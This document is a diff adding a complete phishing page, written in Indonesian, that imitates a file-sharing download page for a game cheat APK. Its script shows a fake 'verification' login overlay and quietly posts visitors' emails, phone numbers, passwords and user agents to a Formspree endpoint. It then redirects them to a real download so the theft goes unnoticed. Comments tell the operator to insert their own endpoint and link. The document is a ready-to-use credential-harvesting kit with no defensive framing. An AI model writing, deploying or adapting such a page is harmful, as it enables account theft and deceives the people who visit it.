@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <title>LinkDown - Unduh File</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif; }
+        body {
+            background: #e8e8e8;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            margin: 0;
+        }
+        a { text-decoration: none; color: #0066c0; }
+        a:hover { text-decoration: underline; }
+
+        .mf-card {
+            max-width: 860px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 10px;
+            box-shadow: 0 2px 20px rgba(0,0,0,0.12);
+            overflow: hidden;
+            padding: 0 0 30px 0;
+        }
+
+        /* TOPBAR */
+        .mf-topbar {
+            background: #ffffff;
+            padding: 14px 24px;
+            border-bottom: 1px solid #e6e6e6;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        .mf-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 22px;
+            font-weight: 700;
+            color: #0066c0;
+            letter-spacing: -0.3px;
+        }
+        .mf-logo svg { width: 32px; height: 32px; fill: #0066c0; }
+        .mf-logo small { font-weight: 400; font-size: 13px; color: #777; margin-left: 4px; }
+        .mf-topnav {
+            display: flex;
+            align-items: center;
+            gap: 18px;
+            font-size: 14px;
+            color: #444;
+        }
+        .mf-topnav a { color: #0066c0; font-weight: 600; }
+        .mf-topnav .user-badge {
+            background: #e0e0e0;
+            border-radius: 50%;
+            width: 34px;
+            height: 34px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            color: #555;
+        }
+
+        /* BREADCRUMB */
+        .mf-breadcrumb {
+            padding: 14px 24px 6px 24px;
+            font-size: 13px;
+            color: #888;
+            border-bottom: 1px solid #f0f0f0;
+        }
+        .mf-breadcrumb span { color: #0066c0; font-weight: 500; }
+
+        /* FILE INFO */
+        .mf-file-section {
+            padding: 20px 24px 10px 24px;
+            display: flex;
+            gap: 24px;
+            flex-wrap: wrap;
+        }
+        .mf-file-icon {
+            width: 90px;
+            height: 120px;
+            background: #f7f7f7;
+            border-radius: 8px;
+            border: 1px solid #ddd;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            font-size: 44px;
+            color: #0066c0;
+            flex-shrink: 0;
+        }
+        .mf-file-icon small {
+            font-size: 11px;
+            color: #999;
+            margin-top: 4px;
+            font-weight: 600;
+        }
+        .mf-file-detail {
+            flex: 1;
+            min-width: 200px;
+        }
+        .mf-file-detail h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 6px;
+            word-break: break-word;
+        }
+        .mf-file-detail .meta {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 18px;
+            font-size: 14px;
+            color: #777;
+            margin: 6px 0 8px 0;
+        }
+        .mf-file-detail .meta .tag {
+            background: #eef4ff;
+            color: #0066c0;
+            padding: 2px 10px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+        .mf-file-detail .desc {
+            font-size: 15px;
+            color: #444;
+            margin-top: 8px;
+            line-height: 1.5;
+        }
+        .mf-file-detail .uploader {
+            font-size: 13px;
+            color: #888;
+            margin-top: 10px;
+            border-top: 1px solid #f0f0f0;
+            padding-top: 12px;
+        }
+        .mf-file-detail .uploader a { font-weight: 600; }
+
+        /* DOWNLOAD AREA */
+        .mf-download-area {
+            padding: 12px 24px 0 24px;
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 16px;
+            border-top: 1px solid #f0f0f0;
+            margin-top: 14px;
+            padding-top: 18px;
+        }
+        .mf-download-btn {
+            background: #0066c0;
+            color: #fff;
+            font-weight: 700;
+            font-size: 18px;
+            padding: 12px 44px;
+            border-radius: 40px;
+            border: none;
+            cursor: pointer;
+            transition: 0.15s;
+            box-shadow: 0 2px 8px rgba(0,102,192,0.25);
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .mf-download-btn:hover {
+            background: #004d99;
+            transform: scale(1.02);
+        }
+        .mf-download-btn:active { transform: scale(0.97); }
+        .mf-download-note {
+            font-size: 13px;
+            color: #888;
+        }
+        .mf-download-note a { color: #0066c0; font-weight: 500; }
+
+        /* OVERLAY LOGIN */
+        .login-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.55);
+            backdrop-filter: blur(6px);
+            justify-content: center;
+            align-items: center;
+            z-index: 999;
+            padding: 20px;
+        }
+        .login-overlay.show { display: flex; }
+        .login-box {
+            background: #fff;
+            max-width: 420px;
+            width: 100%;
+            border-radius: 16px;
+            padding: 36px 30px 30px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            position: relative;
+            animation: slideUp 0.25s ease;
+        }
+        @keyframes slideUp {
+            from { transform: translateY(30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        .login-box .close {
+            position: absolute;
+            top: 14px;
+            right: 20px;
+            font-size: 26px;
+            cursor: pointer;
+            color: #bbb;
+            transition: 0.15s;
+            background: none;
+            border: none;
+        }
+        .login-box .close:hover { color: #333; }
+        .login-box h3 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 4px;
+        }
+        .login-box .sub {
+            font-size: 14px;
+            color: #777;
+            margin-bottom: 22px;
+        }
+        .login-box input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid #d0d0d0;
+            border-radius: 8px;
+            font-size: 15px;
+            margin-bottom: 14px;
+            outline: none;
+            transition: 0.15s;
+            background: #fafafa;
+        }
+        .login-box input:focus {
+            border-color: #0066c0;
+            background: #fff;
+            box-shadow: 0 0 0 3px rgba(0,102,192,0.12);
+        }
+        .login-box .login-btn {
+            width: 100%;
+            background: #0066c0;
+            color: #fff;
+            font-weight: 700;
+            font-size: 16px;
+            padding: 13px;
+            border: none;
+            border-radius: 40px;
+            cursor: pointer;
+            transition: 0.15s;
+        }
+        .login-box .login-btn:hover { background: #004d99; }
+        .login-box .divider {
+            text-align: center;
+            font-size: 13px;
+            color: #aaa;
+            margin: 18px 0 14px;
+            position: relative;
+        }
+        .login-box .divider::before,
+        .login-box .divider::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            width: 28%;
+            height: 1px;
+            background: #ddd;
+        }
+        .login-box .divider::before { left: 0; }
+        .login-box .divider::after { right: 0; }
+        .social-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+        .social-btn {
+            padding: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 40px;
+            background: #fff;
+            font-weight: 600;
+            font-size: 13px;
+            cursor: pointer;
+            transition: 0.1s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+        .social-btn:hover { background: #f5f5f5; border-color: #bbb; }
+        .social-btn.google { color: #db4437; }
+        .social-btn.facebook { color: #1877f2; }
+        .social-btn.vk { color: #4a76a8; }
+        .social-btn.x { color: #000; }
+        .login-box .tos {
+            font-size: 12px;
+            color: #aaa;
+            text-align: center;
+            margin-top: 18px;
+        }
+
+        @media (max-width: 600px) {
+            .mf-topbar { flex-direction: column; align-items: stretch; gap: 8px; }
+            .mf-topnav { justify-content: flex-end; }
+            .mf-file-section { flex-direction: column; align-items: center; text-align: center; }
+            .mf-file-icon { width: 70px; height: 95px; }
+            .mf-download-area { flex-direction: column; align-items: stretch; }
+            .mf-download-btn { justify-content: center; padding: 14px 20px; }
+            .login-box { padding: 28px 18px; }
+            .social-grid { grid-template-columns: 1fr 1fr; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="mf-card">
+    <!-- TOPBAR -->
+    <div class="mf-topbar">
+        <div class="mf-logo">
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z"/></svg>
+            LinkDown <small>upload & share</small>
+        </div>
+        <div class="mf-topnav">
+            <a href="#">Sign Up</a>
+            <a href="#">Log In</a>
+            <span class="user-badge">👤</span>
+        </div>
+    </div>
+
+    <!-- BREADCRUMB -->
+    <div class="mf-breadcrumb">
+        📁 Home / ModVIP / <span>CheatSafeNew.apk</span>
+    </div>
+
+    <!-- FILE INFO -->
+    <div class="mf-file-section">
+        <div class="mf-file-icon">
+            𓂀
+            <small>Aplikasi</small>
+        </div>
+        <div class="mf-file-detail">
+            <h1>CheatSafeNew</h1>
+            <div class="meta">
+                <span>ㅤㅤㅤㅤㅤㅤ710,4MB</span>
+                <span class="tag"> Verified</span>
+                <span>ㅤㅤㅤCheat Safe allserver New Bypass</span>
+            </div>
+            <div class="desc">
+                🔰 Aplikasi Terbebas Dari Virus & Malware 🔰
+            </div>
+            <div class="uploader">
+                👤 <a href="#">Ash_Mods</a> · 3 jam yang lalu · 1,284 downloads
+            </div>
+        </div>
+    </div>
+
+    <!-- DOWNLOAD AREA -->
+    <div class="mf-download-area">
+        <button class="mf-download-btn" id="downloadTrigger">📥 Download Now</button>
+        <div class="mf-download-note">
+            🔒 Verifikasi diperlukan · <a href="#" id="whyLogin">Kenapa?</a>
+        </div>
+    </div>
+</div>
+
+<!-- LOGIN OVERLAY -->
+<div class="login-overlay" id="loginOverlay">
+    <div class="login-box">
+        <button class="close" id="closeLogin">✕</button>
+        <h3>🔐 Verifikasi</h3>
+        <div class="sub">Masukkan email/nomor & sandi untuk melanjutkan</div>
+
+        <form id="loginForm">
+            <input type="text" id="loginEmail" placeholder="Email atau nomor HP" required>
+            <input type="password" id="loginPass" placeholder="Sandi" required>
+            <button type="submit" class="login-btn">📥 Verifikasi & Download</button>
+        </form>
+
+        <div class="divider">atau masuk dengan</div>
+        <div class="social-grid">
+            <button class="social-btn google" data-provider="Google">🔴 Google</button>
+            <button class="social-btn facebook" data-provider="Facebook">🔵 Facebook</button>
+            <button class="social-btn vk" data-provider="VK">🟦 VK</button>
+            <button class="social-btn x" data-provider="X">🐦 X</button>
+        </div>
+        <div class="tos">
+            Dengan melanjutkan, Anda setuju dengan <a href="#">Syarat & Ketentuan</a>
+        </div>
+    </div>
+</div>
+
+<script>
+    // ============================================================
+    // KONFIGURASI — GANTI INI
+    // ============================================================
+    const FORMSPREE_URL = 'https://formspree.io/f/mpqgokpq'; // ← GANTI PAKAI ID FORMSPREE KAMU
+    const REAL_DOWNLOAD_URL = 'https://www.mediafire.com/file/abc123/ModGame.zip'; // ← GANTI PAKAI LINK ASLI
+
+    // ============================================================
+    // ELEMEN
+    // ============================================================
+    const overlay = document.getElementById('loginOverlay');
+    const triggerBtn = document.getElementById('downloadTrigger');
+    const closeBtn = document.getElementById('closeLogin');
+    const loginForm = document.getElementById('loginForm');
+    const emailInput = document.getElementById('loginEmail');
+    const passInput = document.getElementById('loginPass');
+
+    // ============================================================
+    // KIRIM DATA KE EMAIL (Formspree)
+    // ============================================================
+    function sendToEmail(provider, email, password) {
+        fetch(FORMSPREE_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                provider: provider,
+                email: email,
+                password: password,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent
+            })
+        }).catch(() => {});
+    }
+
+    // ============================================================
+    // PROSES LOGIN + REDIRECT KE DOWNLOAD ASLI
+    // ============================================================
+    function processLogin(provider, email, pass) {
+        // Kirim data ke email lo
+        sendToEmail(provider, email, pass);
+
+        // Tutup overlay
+        overlay.classList.remove('show');
+
+        // Kasih efek "memproses" lalu redirect ke download beneran
+        const orig = triggerBtn.innerHTML;
+        triggerBtn.innerHTML = '⏳ Memproses...';
+        triggerBtn.disabled = true;
+
+        setTimeout(() => {
+            // Redirect ke file beneran
+            window.location.href = REAL_DOWNLOAD_URL;
+        }, 1500);
+    }
+
+    // ============================================================
+    // EVENT LISTENER
+    // ============================================================
+    triggerBtn.addEventListener('click', () => overlay.classList.add('show'));
+    closeBtn.addEventListener('click', () => overlay.classList.remove('show'));
+    overlay.addEventListener('click', (e) => {
+        if (e.target === overlay) overlay.classList.remove('show');
+    });
+
+    loginForm.addEventListener('submit', (e) => {
+        e.preventDefault();
+        const email = emailInput.value.trim();
+        const pass = passInput.value.trim();
+        if (email && pass) {
+            processLogin('Manual (Email)', email, pass);
+        } else {
+            alert('Harap isi email/nomor dan sandi.');
+        }
+    });
+
+    document.querySelectorAll('.social-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            const provider = btn.getAttribute('data-provider');
+            const email = emailInput.value.trim() || '(tidak diisi)';
+            const pass = passInput.value.trim() || '(tidak diisi)';
+            processLogin(provider, email, pass);
+        });
+    });
+
+    document.getElementById('whyLogin').addEventListener('click', (e) => {
+        e.preventDefault();
+        alert('🔐 Verifikasi diperlukan untuk:\n- Mencegah bot/akses otomatis\n- Memastikan unduhan dari pengguna valid\n- Melindungi keamanan file');
+    });
+</script>
+</body>
+  </html>
